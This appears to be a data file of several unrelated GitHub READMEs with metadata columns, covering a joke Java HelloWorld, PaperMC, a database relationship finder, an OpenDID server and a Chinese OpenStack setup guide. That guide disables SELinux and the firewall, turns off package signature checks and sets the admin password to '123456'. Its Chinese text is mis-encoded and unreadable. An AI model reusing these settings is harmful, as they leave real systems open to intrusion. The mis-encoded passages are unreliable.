       for (int i = 0; i < foo; i++) {
           System.out.println(""Hello World!"");
       }

       int pippo = 0;
       while (pippo < foo) {
           System.out.println(""Hello World!"");
           pippo++;
       }
   }
   ```

3. **falseMethod() Method**: This method deliberately introduces a bug by attempting to call `length()` on a `null` string.
   ```java
   public void falseMethod() {
       boolean metal = false;
       if (metal == false) {
           String joeyDeCaio = null;
           joeyDeCaio.length();
       }
   }
   ```
### Notes:

- **Bug introduction**: The purpose of `falseMethod()` is to demonstrate a scenario where an exception is thrown. The `NullPointerException` is handled by the JVM, but no explicit exception handling is implemented in this case.
  
- **Extending the Program**: You can extend the program by adding more features like exception handling, more complex message outputs, or additional loops and conditionals.

# JBang Guide

This repository contains a jbang catalog that allows you to run the HelloWorld program with the command `jbang hello@nanowarofsteel/hello`.

## Table of Contents
- [Prerequisites](#jbang-prerequisites)
- [Usage](#jbang-usage)

## JBang Prerequisites

To use the jbang catalog, you need to have jbang installed. You can install jbang [here](https://www.jbang.dev/download/).

## JBang Usage

To run the HelloWorld program with `jbang`, you can use the following command directly without cloning the repository:

```bash
jbang hello@nanowarofsteel/HelloWorld
```

If you have cloned the repository, you can run the program with the following command:

```bash
jbang hello
```

# Docker Guide

This repository contains a Dockerfile that automates the process of building and running a Java application using Maven. The Docker image is built in two stages: the first stage builds the application with Maven, and the second stage runs the application with a minimal OpenJDK 17 image.

## Table of Contents
- [Prerequisites](#prerequisites)
- [Build and Run Instructions](#build-and-run-instructions)
- [Usage](#usage)
- [Cleaning Up](#cleaning-up)
- [Notes](#notes)
- [Performance considerations](#performance-considerations)

## Prerequisites

Before building and running the Docker image, make sure you have the following installed:

- **Docker**: [Install Docker](https://www.docker.com/get-started)
- **Maven**: (Optional) Maven is only needed locally for building the project if you're not using the Docker build.

## Build and Run Instructions

### 1. Clone the repository

First, clone the repository containing the project and the Dockerfile to your local machine:

```bash
git clone https://github.com/NanowarOfSteel/HelloWorld.git
cd HelloWorld
```

### 2. Build the Docker image

You can build the Docker image using the following command. Make sure you're
in the root directory of the project, then point out the location of the
Dockerfile with the `-f` option:

```bash
docker build -t my-java-app .
```

This command will:

1. Use an official Maven image to build the application.
2. Package the application into a JAR file.
3. Use a slim OpenJDK 21 image to run the resulting application (**kinda**).

## Usage

After the build is complete, you can run the Docker container using:

```bash
docker run --rm my-java-app
```

## Cleaning Up

If you didn't use the option `--rm` when instanciating the container, you will
have to manually remove the container and image once you're done:

```bash
docker rm <container_id>  # Remove the container
docker rmi my-java-app    # Remove the image
```

## Notes

- **Multi-stage build**: The Dockerfile uses a multi-stage build to ensure the final image is small and optimized for running the application. The first stage uses the Maven image to build the application, and the second stage uses a slim JDK image to run it.
- **JAR file location**: The final JAR file is copied from the `/target` directory in the Maven build stage to the working directory in the runtime stage (`/app`).

## Performance considerations

In order to achieve better performance experience this code live.
Due to resource allocation issues there are only limited possibilities:

- FRIDAY 21 FEBRUARY 2025: Vienna, Austria - Simm City

- SATURDAY 22 FEBRUARY 2025: Leipzig, Germany - Hellraiser

- SUNDAY 23 FEBRUARY 2025: Stuttgart, Germany - Halle, Im Wizemann

- MONDAY 24 FEBRUARY 2025: Hamburg, Germany - Kaiserkeller (Grosse Freiheit)

- WEDNESDAY 26 FEBRUARY 2025: Paris, France - La Machine du Moulin Rouge

- THURSDAY 27 FEBRUARY 2025: Pratteln, Switzerland - Z7 Konzertfabrik

- FRIDAY 28 FEBRUARY 2025: Villeurbanne, France - La Rayonne

- SATURDAY 1 MARCH 2025: Lindau, Germany - Club Vaudeville

- SUNDAY 2 MARCH 2025: Nuremberg, Germany - HIRSCH

- TUESDAY 4 MARCH 2025: Aarhus, Denmark - VoxHall

- WEDNESDAY 5 MARCH 2025: Tilburg, Netherlands - 013

- THURSDAY 6 MARCH 2025: Frankfurt, Germany - Zoom Frankfurt

- FRIDAY 7 MARCH 2025: Wroc≈Çaw, Poland - Transformator

- SATURDAY 8 MARCH 2025: Budapest, Hungary - Barba Negra

- SUNDAY 9 MARCH 2025: Krakow, Poland - Kwadrat

- MONDAY 10 MARCH 2025: Berlin, Germany - Columbia Theater

- WEDNESDAY 12 MARCH 2025: Antwerp, Belgium - Kavka Zappa

- THURSDAY 13 MARCH 2025: Bochum, Germany - Matrix

- FRIDAY 14 MARCH 2025: Drachten, Netherlands - Poppodium Iduna

- SATURDAY 15 MARCH 2025: Strasbourg, France - Le Molodo√Ø

- SUNDAY 16 MARCH 2025: Munich, Germany - Backstage

- FRIDAY 4 - SATURDAY 5 APRIL 2025: epic fest denmark 2025:  - Roskilde-Hallerne, Roskilde, Denmark

Further information about upcoming resources can be found here: https://tour.nanowar.it

  
## Troubleshooting

- **Issue**: The application isn't starting or doesn't work as expected.
  - **Solution**: Check the logs for any error messages by running:
    ```bash
    docker logs <container_id>
    ```

- **Issue**: Docker build fails due to missing dependencies.
  - **Solution**: Make sure all necessary dependencies are listed in your `pom.xml` file, and try running `mvn clean install` locally to check for issues before attempting the Docker build.

---
## Docker compose guide

## Prerequisites 

- Docker: [Install Docker](https://www.docker.com/get-started)
- Docker compose: [Install Docker Compose](https://docs.docker.com/compose/install)

## Build and Run Instructions 

### 1. Clone the repository 

Do as described in [Docker Build and Run Instructions](#1-clone-the-repository)

### 2. Build and Run

With Docker Compose building and running are done with one command (run in the project root):

```bash
docker compose up
```


This command will build and run the project serving it on port 8080.

For further explanations see the comments in file: _docker-compose.yaml_

By running `docker compose up` the output will be captured by the execution.

You can pass the execution context to the docker daemon by running

```bash
docker compose up -d
```

## Cleaning Up

If you ran `docker compose` without the `-d` flag stop the execution by pressing `ctrl+c`

If you ran `docker compose -d` you can stop the execution by running 

```bash
docker compose down
```

within the directory where the file _docker-compose.yaml_ is located

Run

```bash
docker compose rm
```

to remove the stopped container.

Then do as described in [Cleaning Up for Docker](#cleaning-up) except for the removal of the stopped container part

## Troubleshooting (only for Mac or Linux)

If you get this error:
`Error response from daemon: driver failed programming external connectivity on endpoint helloworld-app-1 (1769c92017f2d2da48adc989bd2321855e3152f6a11932c18ed36e7df443f0ae): failed to bind port 0.0.0.0:8080/tcp: Error starting userland proxy: listen tcp4 0.0.0.0:8080: bind: address already in use'
`

It means the port 8080 is already binded (maybe by the previous docker execution without cleaning up).

To solve it find the process running on port 8080 by running

```bash
lsof -i tcp:8080
```

Note the `PID` value of the output and kill the process by running 

```bash
kill <PID>
```


---

# License

This project is licensed under the IronAvantgarde Publishing & Napalm Records License - see the [Napalm Records Website](https://napalmrecords.com/) for more details.

# Contributing

Feel free to fork this repository, submit issues, or open pull requests if you'd like to improve this code. Contributions are always welcome!

# Contacts

**Do you want some buggy, personalized and singable code by Nanowar Of Steel**? Please contact us [here](mailto:nanowar@nanowar.it). 
",0,14,1,,1,32.0,0.0,1.0,1.0,10.0,0.0,-2.15,3.0
MeoMunDep/Node-Wars,main,"# Disclaimer

This project includes code that is related to encryption. By using this code, you acknowledge the following:

- The encryption methods and algorithms implemented here are provided for educational purposes only. 
- The author does not take any responsibility for any misuse or unintended consequences that may arise from the use of this code.
- It is your responsibility to ensure that you understand the implications of using encryption and to comply with all applicable laws and regulations in your jurisdiction.
- Always conduct thorough testing and validation of any encryption code before deploying it in a production environment.

Use this code at your own risk.
",0,1,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
duzhaokun123/YAPatch,main,"# YAPatch

Yet Another Patching Tool for Android to load xposed modules

## Build

use https://github.com/Reginer/aosp-android-jar/tree/main/android-35 android.jar

```shell
./gradlew patch-loader:copyFiles patch:shadowJar
```

## ÂèØÁî®ÊÄß

Â∑≤ÊµãËØïÂèØÁî®ÁöÑ Â∫îÁî®-Ê®°Âùó,[Ê®°Âùó] Êúâ

- QQ-QAuxiliary
- ÂìîÂì©ÂìîÂì©-ÂìîÂì©Êº´Ê∏∏
- ÂæÆ‰ø°

‰∏çÂèØÁî®ÁöÑ Â∫îÁî® Êúâ

- ËèúÈ∏ü
- Áü•‰πé

## Â∑≤Áü•ÈóÆÈ¢ò

Â≠òÂú®Ëøô‰∏™ÂûÉÂúæÈ°πÁõÆ

## ‰∏ªË¶ÅÊÑüË∞¢
- [Pine](https://github.com/canyie/pine)
- [LSPatch](https://github.com/LSPosed/LSPatch)
- [Xpatch](https://github.com/WindySha/Xpatch)
",10,1,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Trisitana/hudilao_back_end,master,"The backend of the restaurant ordering system - hudilao


![image](https://github.com/user-attachments/assets/3b6daf78-69fb-4e39-b809-4f10dfd80eec)






",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
PaperMC/Paper-archive,ver/1.21.4,"> [!WARNING]
> This is a very early, experimental state of the 1.21.4 update before we started our hard fork process.

Paper [![Paper Build Status](https://img.shields.io/github/actions/workflow/status/PaperMC/Paper/build.yml?branch=master)](https://github.com/PaperMC/Paper/actions)
[![Discord](https://img.shields.io/discord/289587909051416579.svg?label=&logo=discord&logoColor=ffffff&color=7389D8&labelColor=6A7EC2)](https://discord.gg/papermc)
[![GitHub Sponsors](https://img.shields.io/github/sponsors/papermc?label=GitHub%20Sponsors)](https://github.com/sponsors/PaperMC)
[![Open Collective](https://img.shields.io/opencollective/all/papermc?label=OpenCollective%20Sponsors)](https://opencollective.com/papermc)
===========

The most widely used, high-performance Minecraft server that aims to fix gameplay and mechanics inconsistencies.


**Support and Project Discussion:**
- [Our forums](https://forums.papermc.io/) or [Discord](https://discord.gg/papermc)

How To (Server Admins)
------
Paperclip is a jar file that you can download and run just like a normal jar file.

Download Paper from our [downloads page](https://papermc.io/downloads/paper).

Run the Paperclip jar directly from your server. Just like old times

* Documentation on using Paper: [docs.papermc.io](https://docs.papermc.io)
* For a sneak peek at upcoming features, [see here](https://github.com/PaperMC/Paper/projects)

How To (Plugin Developers)
------
* See our API patches [here](patches/api)
* See upcoming, pending, and recently added API [here](https://github.com/orgs/PaperMC/projects/2/views/4)
* Paper API javadocs here: [papermc.io/javadocs](https://papermc.io/javadocs/)
#### Repository (for paper-api)
##### Maven

```xml
<repository>
    <id>papermc</id>
    <url>https://repo.papermc.io/repository/maven-public/</url>
</repository>
```

```xml
<dependency>
    <groupId>io.papermc.paper</groupId>
    <artifactId>paper-api</artifactId>
    <version>1.21.4-R0.1-SNAPSHOT</version>
    <scope>provided</scope>
</dependency>
```
##### Gradle
```kotlin
repositories {
    maven {
        url = uri(""https://repo.papermc.io/repository/maven-public/"")
    }
}

dependencies {
    compileOnly(""io.papermc.paper:paper-api:1.21.4-R0.1-SNAPSHOT"")
}

java {
    toolchain.languageVersion.set(JavaLanguageVersion.of(21))
}
```

How To (Compiling Jar From Source)
------
To compile Paper, you need JDK 21 and an internet connection.

Clone this repo, run `./gradlew applyPatches`, then `./gradlew createMojmapBundlerJar` from your terminal. You can find the compiled jar in the project root's `build/libs` directory.

To get a full list of tasks, run `./gradlew tasks`.

How To (Pull Request)
------
See [Contributing](CONTRIBUTING.md)

Support Us
------
First of all, thank you for considering helping out, we really appreciate that!

PaperMC has various recurring expenses, mostly related to infrastructure. Paper uses [Open Collective](https://opencollective.com/) via the [Open Source Collective fiscal host](https://opencollective.com/opensource) to manage expenses. Open Collective allows us to be extremely transparent, so you can always see how your donations are used. You can read more about financially supporting PaperMC [on our website](https://papermc.io/sponsors).

You can find our collective [here](https://opencollective.com/papermc), or you can donate via GitHub Sponsors [here](https://github.com/sponsors/PaperMC), which will also go towards the collective.

Special Thanks To:
-------------

[![YourKit-Logo](https://www.yourkit.com/images/yklogo.png)](https://www.yourkit.com/)

[YourKit](https://www.yourkit.com/), makers of the outstanding java profiler, support open source projects of all kinds with their full featured [Java](https://www.yourkit.com/java/profiler) and [.NET](https://www.yourkit.com/.net/profiler) application profilers. We thank them for granting Paper an OSS license so that we can make our software the best it can be.

[<img src=""https://user-images.githubusercontent.com/21148213/121807008-8ffc6700-cc52-11eb-96a7-2f6f260f8fda.png"" alt="""" width=""150"">](https://www.jetbrains.com)

[JetBrains](https://www.jetbrains.com/), creators of the IntelliJ IDEA, supports Paper with one of their [Open Source Licenses](https://www.jetbrains.com/opensource/). IntelliJ IDEA is the recommended IDE for working with Paper, and most of the Paper team uses it.

All our sponsors!  
[![Sponsor Image](https://raw.githubusercontent.com/PaperMC/papermc.io/data/sponsors.png)](https://papermc.io/sponsors)
",1,0,17,NOASSERTION,5,0.0,1.0,6.0,1.0,9.0,0.0,-4.3500000000000005,1.0
NoelToy/automatic-relationship-finder,main,"[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![Maven Central](https://img.shields.io/maven-central/v/io.github.noeltoy/automatic-relationship-finder.svg?label=Maven%20Central)](https://search.maven.org/artifact/io.github.noeltoy/automatic-relationship-finder)
[![GitHub release (latest by date)](https://img.shields.io/github/v/release/noeltoy/automatic-relationship-finder?logo=GitHub)](https://github.com/noeltoy/automatic-relationship-finder/releases)
[![javadoc](https://javadoc.io/badge2/io.github.noeltoy/automatic-relationship-finder/javadoc.svg)](https://javadoc.io/doc/io.github.noeltoy/automatic-relationship-finder)
# Automatic Relationship Finder (ARF)

**Automatic Relationship Finder (ARF)** is a Java library that automatically detects implicit relationships between database tables by analyzing column names and data patterns. Designed for OLTP environments where physical relationships may not be defined at the RDBMS level, ARF allows users to configure confidence thresholds for column name and data matching, fine-tuning relationship detection precision. Additionally, ARF provides control over which data types should be considered in relationship checks, ensuring context-specific and targeted analysis.
## Key Features
+ **Automatic Relationship Detection**: ARF identifies relationships between tables in relational databases by analyzing column names and data values, making it useful for databases where physical relationships (like foreign keys) may not be explicitly defined.
+ **Configurable Column Name Matching**: Allows users to specify a confidence level for column name matching, helping the library to recognize and match similarly named columns (e.g., Dist_Code and District Code) based on customizable thresholds.
+ **Data-Based Relationship Matching**: In addition to column names, ARF uses actual data values to detect relationships, allowing for more accurate and context-based results.
+ **Customizable Data Match Confidence**: Users can define a confidence level for data matching, adjusting the sensitivity for relationship detection based on how closely values should match.
+ **Data Type Selection for Matching**: Provides the flexibility to specify which data types (e.g., integers, strings, dates) should be considered when checking for relationships, enabling tailored analysis for different types of data.
+ **Adaptability for OLTP Systems**: Designed with Online Transaction Processing (OLTP) systems in mind, ARF can detect implied relationships in transactional data where explicit keys are not always present.
+ **Java-Based and Easily Integrable**: ARF is built in Java, making it compatible with Java-based applications and libraries, and straightforward to integrate into existing data processing or cataloging systems.

## Use Cases
+ **Data Cataloging and Discovery in Legacy Databases**: Many legacy databases lack explicit primary key-foreign key relationships, which can make data cataloging challenging. ARF helps data cataloging tools infer these implicit relationships, enabling users to understand data linkages without requiring schema modifications.
+ **ETL (Extract, Transform, Load) Optimization**: In ETL workflows, it‚Äôs often crucial to identify relationships between tables to accurately join data from different sources. ARF automates the detection of these relationships, making it easier to configure ETL pipelines for databases that lack physical constraints.
+ **Data Migration Between Systems**: During data migration, especially between OLTP and OLAP systems, ARF can identify hidden relationships within the source data, helping preserve referential integrity and data structure during transformation and loading into the target system.
+ **Database Reverse Engineering**: ARF assists in reverse-engineering undocumented databases by discovering implied relationships between tables, making it easier for developers and data analysts to comprehend the structure and meaning of the data.
+ **Data Quality and Integrity Audits**: By detecting unlinked but related columns, ARF can help data quality tools flag potential data integrity issues, such as missing foreign key constraints or inconsistent data relationships across tables.
+ **Intelligent Data Integration**: When integrating data from multiple sources, ARF can identify potential joins across databases or tables that lack explicit relationships. This capability supports building unified data views and data marts from diverse systems.
+ **Metadata Enrichment for Data Lakes**: For data lakes containing relational data, ARF can help enrich metadata by detecting and documenting relationships. This metadata enrichment supports improved data discovery and governance.
+ **Machine Learning Data Preparation**: In machine learning pipelines, discovering relationships between datasets is essential for feature engineering. ARF helps data scientists automatically detect related tables and columns, making it easier to create joinable datasets and improve model inputs.
+ **Data Lineage Tracking**: Understanding data lineage involves tracing relationships between datasets over time. ARF can aid in capturing implicit relationships as part of a data lineage tracking system, adding context to lineage data that lacks defined foreign keys.

## Dependencies
+ **Java 17 or higher**: The minimum required Java version to run the library.

## Usage/Examples
### Add Maven Dependency
```xml
<dependency>
    <groupId>io.github.noeltoy</groupId>
    <artifactId>automatic-relationship-finder</artifactId>
    <version>1.1</version>
</dependency>
```

### Example
For usage please refer test package.
## License
[Apache License 2.0](https://choosealicense.com/licenses/apache-2.0/)

## Authors
- [@noeltoy](https://github.com/NoelToy)",2,1,2,Apache-2.0,0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0
OmniOneID/did-issuer-server,develop,"Issuer Server
==

Welcome to the Issuer Server Repository. <br>
This repository contains the source code, documentation, and related resources for the Issuer Server.

## Folder Structure
Overview of the major folders and documents in the project directory:

```
did-issuer-server
‚îú‚îÄ‚îÄ CHANGELOG.md
‚îú‚îÄ‚îÄ CLA.md
‚îú‚îÄ‚îÄ CODE_OF_CONDUCT.md
‚îú‚îÄ‚îÄ CONTRIBUTING.md
‚îú‚îÄ‚îÄ LICENSE
‚îú‚îÄ‚îÄ dependencies-license.md
‚îú‚îÄ‚îÄ MAINTAINERS.md
‚îú‚îÄ‚îÄ README.md
‚îú‚îÄ‚îÄ RELEASE-PROCESS.md
‚îú‚îÄ‚îÄ SECURITY.md
‚îú‚îÄ‚îÄ docs
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ api
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ Issuer_API_ko.md
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ db
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ OpenDID_TableDefinition_Issuer.md
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ errorCode
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ Issuer_ErrorCode.md
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ installation
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ OpenDID_IssuerServer_InstallationAndOperation_Guide.md
‚îî‚îÄ‚îÄ source
    ‚îî‚îÄ‚îÄ did-issuer-server
        ‚îú‚îÄ‚îÄ gradle
        ‚îú‚îÄ‚îÄ libs
            ‚îî‚îÄ‚îÄ did-sdk-common-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-blockchain-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-core-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-crypto-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-datamodel-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-wallet-sdk-server-1.0.0.jar
        ‚îú‚îÄ‚îÄ sample
        ‚îî‚îÄ‚îÄ src
        ‚îî‚îÄ‚îÄ build.gradle
        ‚îî‚îÄ‚îÄ README.md
        ‚îî‚îÄ‚îÄ README_ko.md
```

<br/>

Below is a description of each folder and file in the directory:

| Name                             | Description                                     |
| -------------------------------- | ----------------------------------------------- |
| CHANGELOG.md                     | Version-specific changes in the project         |
| CODE_OF_CONDUCT.md               | Code of conduct for contributors                |
| CONTRIBUTING.md                  | Contribution guidelines and procedures          |
| LICENSE                          | License                                         |
| dependencies-license.md          | Licenses for the project‚Äôs dependency libraries |
| MAINTAINERS.md                   | Guidelines for project maintainers              |
| RELEASE-PROCESS.md               | Procedures for releasing new versions           |
| SECURITY.md                      | Security policies and vulnerability reporting   |
| docs                             | Documentation                                   |
| ‚îñ api                            | API guide documentation                         |
| ‚îñ db                             | Database Table Specifications                   |
| ‚îñ errorCode                      | Error codes and troubleshooting guides          |
| ‚îñ installation                   | Installation and setup instructions             |
| source                           | Server source code project                      |
| ‚îñ did-issuer-server              | Issuer Server source code and build files       |
| &nbsp;&nbsp;&nbsp;‚îñ gradle       | Gradle build configurations and scripts         |
| &nbsp;&nbsp;&nbsp;‚îñ libs         | External libraries and dependencies             |
| &nbsp;&nbsp;&nbsp;‚îñ sample       | Sample files                                    |
| &nbsp;&nbsp;&nbsp;‚îñ src          | Main source code directory                      |
| &nbsp;&nbsp;&nbsp;‚îñ build.gradle | Gradle build configuration file                 |
| &nbsp;&nbsp;&nbsp;‚îñ README.md    | Overview and instructions for the source code   |

<br/>


## Libraries

Libraries used in this project are organized into two main categories:

1. **Open DID Libraries**: These libraries are developed by the Open DID project and are available in the [libs folder](source/did-issuer-server/libs). They include:

   - `did-sdk-common-1.0.0.jar`
   - `did-blockchain-sdk-server-1.0.0.jar`
   - `did-core-sdk-server-1.0.0.jar`
   - `did-crypto-sdk-server-1.0.0.jar`
   - `did-datamodel-sdk-server-1.0.0.jar`
   - `did-wallet-sdk-server-1.0.0.jar`

2. **Third-Party Libraries**: These libraries are open-source dependencies managed via the [build.gradle](source/did-issuer-server/build.gradle) file. For a detailed list of third-party libraries and their licenses, please refer to the [dependencies-license.md](dependencies-license.md) file.

## Installation And Operation Guide

For detailed instructions on installing and configuring the Issuer Server, please refer to the guide below:
- [OpenDID Issuer Server Installation and Operation Guide](docs/installation/OpenDID_IssuerServer_InstallationAndOperation_Guide.md)  

## API Reference

API documentation is available in two main types:

- **Issuer API**: Detailed reference for the Issuer Server's API endpoints and usage.
  - [Issuer API Reference](docs/api/Issuer_API_ko.md)

## Change Log

The Change Log provides a detailed record of version-specific changes and updates. You can find it here:
- [Change Log](./CHANGELOG.md)
 
## OpenDID Demonstration Videos <br>
To watch our demonstration videos of the OpenDID system in action, please visit our [Demo Repository](https://github.com/OmniOneID/did-demo-server). <br>

These videos showcase key features including user registration, VC issuance, and VP submission processes.

## Contributing

Please read [CONTRIBUTING.md](CONTRIBUTING.md) and [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) for details on our code of conduct, and the process for submitting pull requests to us.

## License
[Apache 2.0](LICENSE)
",1,0,3,Apache-2.0,3,18.0,1.0,3.0,1.0,16.0,0.0,-4.75,12.0
xiegangqingnian1021/devops,master,"# ÊâãÊíï‰∫ëËÆ°ÁÆóËøêÁª¥ÂºÄÂèë

## 1.ÁõÆÂΩïÁªìÊûÑ

`fronted/` ÂâçÁ´Ø Âü∫‰∫é `vue`

`backend/` ÂêéÁ´Ø Âü∫‰∫é `SpringBoot`

`cmd/` ËøêÁª¥ËÑöÊú¨ Âü∫‰∫é `Linux Shell`

## 2.ÂáÜÂ§áÁéØÂ¢É

### 2.1‰∫ëËÆ°ÁÆóÂπ≥Âè∞Êê≠Âª∫

Êú¨Á≥ªÁªüÈááÁî®RedHatOpenStackPlatformÊê≠Âª∫ÁßÅÊúâ‰∫ë

‰ª•ÂçïËäÇÁÇπ‰∏∫‰æãÔºåËäÇÁÇπIP‰∏∫`192.168.105.10`Ôºå‰ΩøÁî®vmwareÂàõÂª∫‰∏ÄÂè∞`CentOS7.5`ËôöÊãüÊú∫ÔºåÈÖçÁΩÆ‰∏∫4Ê†∏CPU/8G/100GÔºå‰∏ªÊú∫Âêç‰∏∫controller

Êê≠Âª∫Ê≠•È™§Â¶Ç‰∏ã
- ÂÖ≥Èó≠Áõ∏ÂÖ≥ÊúçÂä°

ÊâÄÊúâËäÇÁÇπÂ°´ÂÜôÁΩëÁªúÊò†Â∞Ñ
```shell
$ echo ""192.168.105.10 controller"" >> /etc/hosts
```
ÊâÄÊúâËäÇÁÇπÊ∞∏‰πÖÂÖ≥Èó≠ selinuxÔºåÊ∞∏‰πÖÂÖ≥Èó≠ firewalldÔºåÊ∞∏‰πÖÂÖ≥Èó≠ NetworkManager
```shell
$ systemctl stop firewalld; systemctl disable firewalld
$ systemctl stop NetworkManager; systemctl disable NetworkManager
$ sed -i 's#SELINUX=.*#SELINUX=disabled#g' /etc/selinux/config
$ reboot
```
- ÈÖçÁΩÆyum

Ê∏ÖÁ©∫yumÊ∫ê

```shell
$ mv /etc/yum.repos.d/* /tmp/
```
Âú®controllerËäÇÁÇπÊåÇËΩΩÊú¨Âú∞Ê∫ê
```shell
$ mkdir -p /opt/{centos,extras,openstack}

$ mount -o loop /root/CentOS-7-x86_64-Everything-1804.iso /mnt/
$ cp -rvf /mnt/* /opt/centos/
$ umount /mnt/

$ mount -o loop /root/RHEL7-extras.iso /mnt/
$ cp -rvf /mnt/* /opt/extras/
$ umount /mnt/

$ mount -o loop /root/RHEL7OSP-10.iso /mnt/
$ cp -rvf /mnt/* /opt/openstack/
$ umount /mnt/
```
Âú®controllerËäÇÁÇπÁºñÂÜôÊú¨Âú∞Ê∫ê
```shell
$ vi /etc/yum.repos.d/local.repo
[centos]
name=centos
baseurl=file:///opt/centos/
gpgcheck=0
enabled=1

[extras]
name=extras
baseurl=file:///opt/extras/
gpgcheck=0
enabled=1

[openstack]
name=openstack-10
baseurl=file:///opt/openstack/rhel-7-server-openstack-10-rpms/
gpgcheck=0
enabled=1

[openstack-devtool]
name=openstack-10-devtools
baseurl=file:///opt/openstack/rhel-7-server-openstack-10-devtools-rpms/
gpgcheck=0
enabled=1
```
- ÈúÄË¶ÅÂÆâË£ÖÁöÑ‰æùËµñÂåÖ

qemu-kvm -> Á°¨‰ª∂‰ªøÁúü -> computeËäÇÁÇπ

libvirt-daemon -> ÂêéÂè∞ÁÆ°ÁêÜËøõÁ®ãÔºåÁÆ°ÁêÜÁ°¨‰ª∂‰ªøÁúü -> computeËäÇÁÇπ

libvirt-daemon-driver-qemu -> È©±Âä®Á®ãÂ∫è -> computeËäÇÁÇπ

libvirt-client -> ÂêéÂè∞ÁÆ°ÁêÜÁöÑÊé•Âè£ -> computeËäÇÁÇπ

python-setuptools -> Python -> controllerËäÇÁÇπ

ËäÇÁÇπÂÆâË£Ö‰æùËµñ

```shell
$ yum -y install qemu-kvm libvirt-client libvirt-daemon libvirt-daemon-driver-qemu python-setuptool
```

- Ê£ÄÊü•Âü∫Á°ÄÁéØÂ¢É

ÊòØÂê¶Á¶ÅÁî® firewalld Âíå NetworkManager

ÊòØÂê¶‰∏∫ÈùôÊÄÅ IP

‰∏ªÊú∫‰πãÈó¥ÊòØÂê¶ËÉΩ ping ÈÄö

‰æùËµñÂåÖÊòØÂê¶ÊòØ10670

‰æùËµñÊòØÂê¶ÂÆâË£Ö

```shell
$ systemctl start libvirtd
```

NTPÊòØÂê¶ÂèØÁî®ÔºåÊó∂Èó¥ÊòØÂê¶ÂêåÊ≠•

Ê£ÄÊü• /etc/resolv.conf ‰∏çËÉΩÊúâsearchÂºÄÂ§¥ÁöÑË°å
- ÂÆâË£ÖOpenStackÈúÄË¶Å‰ΩøÁî®ÁöÑ PackStack

Âú® controllerËäÇÁÇπ ÂÆâË£Ö

```shell
$ cd /root/
#ÂÆâË£ÖPackStack
$ yum -y install openstack-packstack
#‰ΩøÁî®PackStackÂàõÂª∫Â∫îÁ≠îÊñá‰ª∂
$ packstack --gen-answer-file=answer.ini
```

- ‰øÆÊîπÂ∫îÁ≠îÊñá‰ª∂

```shell
$ sed -i ""s#^CONFIG_SWIFT_INSTALL=.*#CONFIG_SWIFT_INSTALL=n#g"" answer.ini
$ sed -i ""s#^CON:FIG_CEILOMETER_INSTALL=.*#CONFIG_CEILOMETER_INSTALL=n#g"" answer.ini
$ sed -i ""s#^CONFIG_AODH_INSTALL=.*#CONFIG_AODH_INSTALL=n#g"" answer.ini
$ sed -i ""s#^CONFIG_GNOCCHI_INSTALL=.*#CONFIG_GNOCCHI_INSTALL=n#g"" answer.ini
$ sed -i ""s#^CONFIG_NTP_SERVERS=.*#CONFIG_NTP_SERVERS=time1.aliyun.com#g"" answer.ini
$ sed -i ""s#^CONFIG_COMPUTE_HOSTS=.*#CONFIG_COMPUTE_HOSTS=192.168.105.10#g"" answer.ini
$ sed -i ""s#^CONFIG_NETWORK_HOSTS=.*#CONFIG_NETWORK_HOSTS=192.168.105.10#g"" answer.ini
$ sed -i ""s#^CONFIG_KEYSTONE_ADMIN_PW=.*#CONFIG_KEYSTONE_ADMIN_PW=123456#g"" answer.ini
$ sed -i ""s#^CONFIG_NEUTRON_ML2_TYPE_DRIVERS=.*#CONFIG_NEUTRON_ML2_TYPE_DRIVERS=flat,vxlan#g"" answer.ini
$ sed -i ""s#^CONFIG_NEUTRON_OVS_BRIDGE_MAPPINGS=.*#CONFIG_NEUTRON_OVS_BRIDGE_MAPPINGS=physnet1:br-ex#g"" answer.ini
$ sed -i ""s#^CONFIG_NEUTRON_OVS_BRIDGE_IFACES=.*#CONFIG_NEUTRON_OVS_BRIDGE_IFACES=br-ex:ens33#g"" answer.ini
$ sed -i ""s#^CONFIG_PROVISION_DEMO=.*#CONFIG_PROVISION_DEMO=n#g"" answer.ini
```

- ÂÆâË£Ö

```shell
$ packstack --answer-file=answer.ini
```

- È™åËØÅÂÆâË£ÖÊòØÂê¶ÊàêÂäü

ÈÖçÁΩÆDashboard

```
$ vi /etc/httpd/conf.d/15-horizon_vhost.conf
#Âú® WSGIProcessGroup apache ‰∏ãÈù¢ ÊèíÂÖ•‰∏ÄË°å
WSGIApplicationGroup %{GLOBAL}

$ systemctl reload httpd
```


È™åËØÅÁôªÂΩï OpenStack dashboard

http://192.168.105.10/dashboard

Áî®Êà∑ÂêçÔºöadmin

ÂØÜÁ†ÅÔºö123456

### 2.2 ËøêÁª¥Âπ≥Âè∞ËøêË°åÁéØÂ¢É

ËäÇÁÇπIP‰∏∫`192.168.105.20`Ôºå‰ΩøÁî®vmwareÂàõÂª∫‰∏ÄÂè∞`CentOS7.5`ËôöÊãüÊú∫ÔºåÈÖçÁΩÆ‰∏∫2Ê†∏CPU/2G/40GÔºå‰∏ªÊú∫Âêç‰∏∫devops

- ÂÆâË£Ödocker

```shell
# ÈÖçÁΩÆdocker‰ªìÂ∫ì
$ curl -o /etc/yum.repos.d/docker-ce.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo

# ‰øÆÊîπCentOSÂü∫Á°Ä‰ªìÂ∫ì‰∏∫aliyun
